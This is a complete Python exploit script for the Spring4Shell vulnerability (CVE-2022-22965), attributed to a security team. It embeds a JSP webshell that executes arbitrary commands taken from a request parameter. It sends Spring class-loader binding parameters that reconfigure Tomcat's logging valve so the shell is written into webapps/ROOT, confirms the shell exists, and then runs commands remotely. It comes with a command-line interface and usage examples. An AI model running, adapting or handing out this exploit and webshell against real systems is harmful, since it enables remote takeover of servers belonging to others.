#!/usr/bin/env python3
"""
Title:     Spring4Shell Exploit
Author:    Hyperion Gray Security Team
Homepage:  https://www.hyperiongray.com
Date:      2024-12-15
CVE:       CVE-2022-22965
Advisory:  https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement
Tested on: Spring Framework 5.3.17, Java 11, Tomcat 9

This exploit demonstrates the Spring4Shell vulnerability by writing a webshell
to a vulnerable Spring application running on Tomcat.
"""

import argparse
import requests
import logging
import time
from urllib.parse import urljoin, quote

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class Spring4ShellExploit:
    """Exploit for CVE-2022-22965 (Spring4Shell)"""
    
    # Simple JSP webshell
    WEBSHELL_CONTENT = """
    <%@ page import="java.util.*,java.io.*"%>
    <%
    if (request.getParameter("cmd") != null) {
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = response.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            os.write(disr.getBytes());
            os.write("\\n".getBytes());
            disr = dis.readLine();
        }
    }
    %>
    """.strip()
    
    def __init__(self, target_url, shell_name='shell.jsp', shell_path=''):
        self.target_url = target_url.rstrip('/')
        self.shell_name = shell_name
        self.shell_path = shell_path
        self.session = requests.Session()
        
    def check_vulnerable(self):
        """Check if the target might be vulnerable"""
        logger.info("Checking if target is vulnerable...")
        
        try:
            # Send a benign request to see if Spring binding works
            test_params = {
                'class.module.classLoader.resources.context.parent.pipeline.first.pattern': 'test',
                'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
                'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
                'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'test',
                'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': '',
            }
            
            response = self.session.post(self.target_url, data=test_params, timeout=10)
            
            # If we get a response without errors, it might be vulnerable
            if response.status_code in [200, 400, 500]:
                logger.info("Target appears to be running Spring Framework")
                return True
            else:
                logger.warning(f"Unexpected response code: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error checking target: {e}")
            return False
    
    def exploit(self):
        """Exploit the vulnerability and write a webshell"""
        logger.info(f"Attempting to exploit {self.target_url}")
        
        # Determine the webshell path
        if self.shell_path:
            webshell_location = f"{self.shell_path}/{self.shell_name}"
        else:
            webshell_location = self.shell_name
        
        logger.info(f"Target webshell location: {webshell_location}")
        
        # Payload to write the webshell
        # This exploits Spring's data binding to access Tomcat's valve configuration
        exploit_params = {
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern': 
                self.WEBSHELL_CONTENT,
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix': 
                '.jsp',
            'class.module.classLoader.resources.context.parent.pipeline.first.directory': 
                'webapps/ROOT',
            'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 
                self.shell_name.replace('.jsp', ''),
            'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': 
                '',
        }
        
        try:
            # Send the exploit
            logger.info("Sending exploit payload...")
            response = self.session.post(
                self.target_url,
                data=exploit_params,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10
            )
            
            logger.info(f"Response status: {response.status_code}")
            
            # Wait a moment for the file to be written
            time.sleep(2)
            
            # Try to access the webshell
            shell_url = urljoin(self.target_url, self.shell_name)
            logger.info(f"Checking if webshell was created at: {shell_url}")
            
            test_response = self.session.get(shell_url, timeout=5)
            
            if test_response.status_code == 200:
                logger.info("âœ“ Webshell successfully created!")
                logger.info(f"\nWebshell URL: {shell_url}")
                logger.info(f"Example usage: {shell_url}?cmd=whoami")
                logger.info(f"               curl '{shell_url}?cmd=id'")
                return True
            else:
                logger.warning(f"Webshell check returned status {test_response.status_code}")
                logger.info("The exploit may have failed, or the webshell is at a different location.")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error during exploitation: {e}")
            return False
    
    def execute_command(self, command):
        """Execute a command via the webshell"""
        shell_url = urljoin(self.target_url, self.shell_name)
        
        try:
            logger.info(f"Executing command: {command}")
            response = self.session.get(
                shell_url,
                params={'cmd': command},
                timeout=10
            )
            
            if response.status_code == 200:
                logger.info("Command output:")
                print(response.text)
                return True
            else:
                logger.error(f"Error executing command: status {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error executing command: {e}")
            return False


def main():
    parser = argparse.ArgumentParser(
        description='Spring4Shell (CVE-2022-22965) Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic exploitation
  python3 exploit.py --url http://target:8080/app

  # Check if vulnerable without exploiting
  python3 exploit.py --url http://target:8080/app --check-only

  # Custom webshell name and location
  python3 exploit.py --url http://target:8080/app --shell-name custom.jsp

  # Execute command after exploitation
  python3 exploit.py --url http://target:8080/app --command whoami
        """
    )
    
    parser.add_argument('--url', required=True, help='Target application URL')
    parser.add_argument('--shell-name', default='shell.jsp', help='Webshell filename (default: shell.jsp)')
    parser.add_argument('--shell-path', default='', help='Webshell path (default: webapps/ROOT)')
    parser.add_argument('--check-only', action='store_true', help='Only check if target is vulnerable')
    parser.add_argument('--command', help='Command to execute after exploitation')
    
    args = parser.parse_args()
    
    exploit = Spring4ShellExploit(args.url, args.shell_name, args.shell_path)
    
    # Check vulnerability
    if not exploit.check_vulnerable():
        logger.error("Target does not appear to be vulnerable or is not reachable")
        return
    
    if args.check_only:
        logger.info("Check complete. Use without --check-only to attempt exploitation.")
        return
    
    # Attempt exploitation
    if exploit.exploit():
        logger.info("\n[SUCCESS] Exploitation successful!")
        
        # Execute command if provided
        if args.command:
            exploit.execute_command(args.command)
    else:
        logger.error("\n[FAILED] Exploitation failed")
        logger.info("Possible reasons:")
        logger.info("  - Target is not vulnerable")
        logger.info("  - Application is not deployed as WAR")
        logger.info("  - Java version is 8 or lower")
        logger.info("  - Servlet container is not Tomcat")


if __name__ == '__main__':
    main()
